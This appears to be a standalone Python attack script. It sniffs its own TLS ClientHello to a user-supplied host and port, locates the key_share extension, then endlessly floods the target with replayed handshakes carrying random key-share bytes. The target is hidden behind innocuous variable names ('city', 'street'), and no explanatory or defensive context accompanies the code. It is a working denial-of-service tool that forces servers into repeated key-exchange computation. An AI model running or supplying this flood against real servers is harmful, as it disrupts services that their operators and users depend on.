from scapy.all import sniff
import socket
import ssl
import threading
import time
import os

city = None
street = None
packet = []
pay = b""
keya = None
keyz = None

def setting():
    global city, street
    my_input = input("Tell Me\n")
    city, street = my_input.split(":")

def capture_pkt():
    global packet, city, street
    packet = sniff(
        filter=f"dst host {city} and dst port {street}",
        timeout=1,
        store=1
        )
    print(f"{len(packet)} captured")

def make_tls():
    global city, street
    time.sleep(0.5)
    tcp_socket = socket.create_connection((city, street))
    ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS)
    ssl_context.verify_mode = ssl.CERT_NONE
    ssl_context.check_hostname = False
    tls_socket = ssl_context.wrap_socket(tcp_socket, server_hostname=city)
    tls_socket.close()
    tcp_socket.close()

def analyze_pkt():
    global packet, pay, keya, keyz
    for pkt in packet:
        if pkt.haslayer('TCP'):
            tcp_layer = pkt['TCP']
            if tcp_layer.payload:
                pay = bytes(tcp_layer.payload)
                if pay[0] == 0x16:
                    if pay[5] == 0x01:
                        session_id_length = pay[43]
                        cipher_suites_length = int.from_bytes(
                            pay[44 + session_id_length:46 + session_id_length], 'big'
                        )
                        compression_methods_length = pay[46 + session_id_length + cipher_suites_length]
                        extensions_start = (
                            47 + session_id_length + cipher_suites_length + compression_methods_length
                        )
                        extensions_length = int.from_bytes(
                            pay[extensions_start:extensions_start + 2], 'big'
                        )
                        extensions_end = extensions_start + 2 + extensions_length
                        extensions_data = pay[extensions_start:extensions_end]
                        key_share_relative_position = extensions_data.find(b'\x00\x33')
                        if key_share_relative_position != -1:
                            key_share_start = extensions_start + key_share_relative_position
                            key_share_length = int.from_bytes(
                                extensions_data[key_share_relative_position + 2:key_share_relative_position + 4], 'big'
                            )
                            key_share_end = key_share_start + 4 + key_share_length
                            keya = key_share_start + 10
                            keyz = key_share_end
                            print("packet parsed")
                            break

def faking():
    global keyz, keya, pay, city, street
    tring = 0
    while True:
        tring += 1
        random_bytes = os.urandom(keyz - keya)
        faked = pay[:keya] + random_bytes + pay[keyz:]
        tcp_sock = socket.create_connection((city, street))
        tcp_sock.sendall(faked)
        tcp_sock.shutdown(socket.SHUT_RDWR)
        tcp_sock.close()
        print(f"{tring} tried")

if __name__ == "__main__":
    setting()
    capturing = threading.Thread(target=capture_pkt)
    capturing.start()
    make_tls()
    capturing.join()
    analyze_pkt()
    faking()
